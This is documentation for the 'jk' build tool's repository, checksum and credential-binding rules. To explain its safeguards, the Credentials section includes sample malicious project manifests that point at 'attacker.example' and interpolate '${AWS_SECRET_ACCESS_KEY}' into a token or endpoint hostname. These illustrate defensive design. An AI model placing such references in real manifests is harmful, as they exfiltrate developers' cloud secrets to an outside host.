# Repositories and auth

```bash
jk auth login                  # GitHub / GitLab / Gitea / Bitbucket
jk repo login | logout | search | refresh
```

Credentials: env, `jk repo login`, or Maven `settings.xml` — see [Credentials](#credentials) for
the order and for why a credential only travels to the origin its name is bound to. Prefer
`${VAR}` references in your own `~/.jk/config.toml` over secrets in TOML. Corporate mirrors, forge
package registries, S3/MinIO, and GCS are supported. After lock, a digest-matching file in the Maven local repository is used in
place; otherwise `JK_STORE_DIR/repos/<name>/`. Set `[m2] integration = false` to keep
third-party jars only under the jk store. `jk install` writes the Maven local repo
when `[m2] install` is on (default); `[m2] install = false` or `JK_M2_INSTALL=false`
keeps those artifacts in `repos/jk-local`. First-party workers always live in `repos/jk-local`
(`jk-local` is reserved; `[repositories.local]` is a normal user remote name).

## Built-in remotes

When you declare none: **JumpKick official repo → Maven Central → Google Maven**.
Routing is exclusive by group:

| Coordinates | Where they resolve |
|-------------|--------------------|
| `cc.jumpkick`, `cc.jumpkick.*`, `build.jumpkick`, `build.jumpkick.*` | **JumpKick only** (never Central) — dependency-confusion safe |
| `androidx.*`, `com.android.*`, `com.google.android.*`, Firebase/ML Kit/Play-related Google Android groups | **Google Maven only** |
| Everything else | **Central** (JumpKick/Google specialists are not probed for unbound third-party GAs) |

Official product URL: `https://jumpkick.build/repo/` (override `JK_OFFICIAL_REPO_URL`).
Publishing that repo: [contributor maven-repo](../contributors/maven-repo.md).

Google’s exclusive set applies whenever the Google Android Maven remote is present
(built-in or declared as `google` / `dl.google.com`). Override with
`[repositories.google] groups = [...]` if you must. Declared `groups` on Google are
**additive** to the default Android bindings.

## Exclusive groups (your internals)

When you declare an **internal** repository next to a public one, bind *your* Maven
namespaces so those coordinates are **never** fetched from other remotes:

```toml
[repositories.central]
url = "https://repo.maven.apache.org/maven2/"

[repositories.internal]
url = "https://repo.acme.com/maven"
groups = ["com.acme", "com.acme.*"]
```

- **Bound group** → solver only sees versions from claiming repos (a higher version
  planted on Central cannot win).
- **Unbound group** → general remotes in declared order; first repo advertising any
  version answers. Only when every general remote misses does jk fall back to
  non-claiming specialists.
- **Already locked** artifacts keep their lockfile source pin until you re-resolve that
  line (`jk update`).
- Multiple repositories **without** any `groups` → jk **warns once** per lock (still
  resolves). Add exclusive bindings for internal namespaces.

`jk repo refresh <coord>` re-fetches a coordinate (lock-time checksum mismatch is
fail-closed; this is the intentional redo).

## Transport and checksum trust

`jk lock` is where a checksum becomes law, so the bytes it pins must arrive over a channel
nobody can rewrite and match a checksum the repository itself publishes. A repository that
cannot offer one of those is refused until its table says so:

```toml
[repositories.mirror]
url = "http://nexus.corp.example/maven"   # refused without the next line
allow-insecure = true

[repositories.legacy]
url = "https://old.example/maven"          # publishes no .sha256 / .sha1 sidecars
allow-unverified = true
```

| Key | Default | What it accepts | The threat it accepts |
|-----|---------|-----------------|-----------------------|
| `allow-insecure` | `false` | A plaintext `http://` URL. Without it the manifest fails to load, naming the repository and URL. Loopback hosts (`localhost`, `127.*`, `::1`) need no opt-in: there is no network path to sit on. | Anyone on the network path can replace the bytes jk pins, and the lockfile then faithfully protects the tampered jar. |
| `allow-unverified` | `false` | Pinning an artifact the repository publishes neither `.sha256` nor `.sha1` for. Without it `jk lock` / `jk update` fail, naming the artifact and repository. | The pin is taken from whatever the wire delivered, with nothing from the publisher vouching for it. |

Both are refused on `central`: Maven Central serves https and publishes a checksum for every
artifact, so the opt-in would only ever hide an attack. `file://` repositories are local disk
with no network path, so neither key applies to them.

When a repository has opted out, the lock summary says so — `Resolved 42 dependencies ·
2 unverified (allowed) · insecure (allowed): mirror` — so the count is visible on every lock
instead of scrolling past as a warning. After the lock, builds enforce the pinned sha256 as
usual.

## Credentials

Sources, in order — the first that yields a credential wins:

1. inline in the `[repositories.<id>]` table: `token`, or `username` + `password`, normally as
   `${VAR}` references expanded when the repository is used — see [Who may write a
   `${VAR}` reference](#who-may-write-a-var-reference)
2. `JK_REPO_<ID>_TOKEN`, or `JK_REPO_<ID>_USERNAME` + `JK_REPO_<ID>_PASSWORD` — `<ID>` is the id
   upper-cased with every non-alphanumeric as `_` (`corp-nexus` → `CORP_NEXUS`)
3. `jk repo login <id>` (stored under `~/.jk/creds/repo/`, owner-only)
4. the `<server>` with that `<id>` in `~/.m2/settings.xml`
5. a `jk auth login` forge token, for forge package registries (matched by host)

### A name is not a destination

Sources 2–4 are keyed by the repository *id*, and the project's `jk.toml` chooses which URL that
id points at. Left alone, a cloned project declaring `[repositories.ossrh] url =
"https://attacker.example/m2/"` would receive whatever your machine holds under `ossrh` on its
first resolve. So a name-keyed credential is sent only to an origin (scheme, host, port) that
something the project cannot edit binds the name to:

| Binding | Where it comes from |
|---------|---------------------|
| the URL `jk repo login <id>` recorded | the login itself. Run inside a project it binds to the URL `~/.jk/config.toml` or that project's `jk.toml` declares for the id (printed on login); `--url <url>` binds explicitly; a host-shaped id (`ghcr.io`, `127.0.0.1:5000`) binds to `https://<id>` |
| `[repositories.<id>]` in `~/.jk/config.toml` | your own config; its origin must match the project's |
| `JK_REPO_<ID>_HOST=<host[:port]>` (or a full URL) | your shell or CI variables. A project's `.env` cannot supply it |
| the id *is* the host | container registries and other repositories addressed by host |

A user-config declaration outranks the rest: if it names another origin than the project does, the
credential stays home even when a `JK_REPO_<ID>_HOST` agrees with the project.

When a credential exists but nothing binds it — or something binds it elsewhere — the repository
is accessed anonymously and jk warns once per run, naming the repository, the origin it declares,
the source that was held back and what would send it:

```
jk: warning: repository `ossrh` at https://attacker.example is accessed anonymously: a credential
for that name exists in the `jk repo login ossrh` store, but `jk repo login ossrh` stored it for
https://s01.oss.sonatype.org, not https://attacker.example; …
```

CI that exports `JK_REPO_INTERNAL_TOKEN` for a repository the project declares exports
`JK_REPO_INTERNAL_HOST=repo.acme.com` beside it.

### Who may write a `${VAR}` reference

An inline `${VAR}` reads your shell too, and which file wrote it decides whether it may:

| Declared in | `${VAR}` may name |
|-------------|-------------------|
| `~/.jk/config.toml` | any variable — the file is yours, and its declaration supplies the credential even when the project declares the same id at the same origin |
| a project `jk.toml` | only the repository's own `JK_REPO_<ID>_*` variables, sent under the same binding rule as the environment source above |

A project manifest is anyone's: a cloned one declaring `[repositories.internal] url =
"https://attacker.example/" token = "${AWS_SECRET_ACCESS_KEY}"` would otherwise receive that value in
the `Authorization` header of its first resolve. So a project's reference to any other variable is
refused, the repository is accessed anonymously, and jk warns once per run:

```
jk: warning: repository `internal` at https://attacker.example is accessed anonymously: its
[repositories.internal] table interpolates ${AWS_SECRET_ACCESS_KEY}, and a project manifest may not
read a variable of your shell into a repository's credential or object-store keys — a cloned project
could name any of them. To send one, declare [repositories.internal] with this URL and the ${VAR}
reference in ~/.jk/config.toml,
export JK_REPO_INTERNAL_TOKEN (or JK_REPO_INTERNAL_USERNAME + JK_REPO_INTERNAL_PASSWORD) with
JK_REPO_INTERNAL_HOST=attacker.example, or run `jk repo login internal --url https://attacker.example/`.
```

The rule covers every `${VAR}` a `[repositories.<id>]` table writes, not only `token` /
`username` / `password`: an object-store repository's `access-key`, `secret-key` and
`session-token`, and its `region` and `endpoint` too — a region rides the request signature in
clear and an endpoint becomes a host name to resolve, so `endpoint =
"https://${AWS_SECRET_ACCESS_KEY}.attacker.example"` would leak the value exactly as `secret-key`
would. A refused object-store key is left unset (the transport falls back to the ambient AWS chain,
or goes unsigned); the literal keys beside it stay. A `[repositories.<id>]` table in
`~/.jk/config.toml` at the same origin supplies its own object-store keys instead, whatever the
project wrote.

A literal credential written into either file is that file's own secret and is used as written;
committing one to a project is a leak of the project's secret, not of yours.

Every `JK_REPO_*` variable is read from the shell that runs `jk` and sent with the request, so it
reaches a resident engine that another terminal started, for that request only. Exporting a token
in a new terminal is enough; no `jk engine stop` is needed.

## Related

[Lockfile](lockfile.md) · [Publish](publish.md) · [Dependencies](dependencies.md)
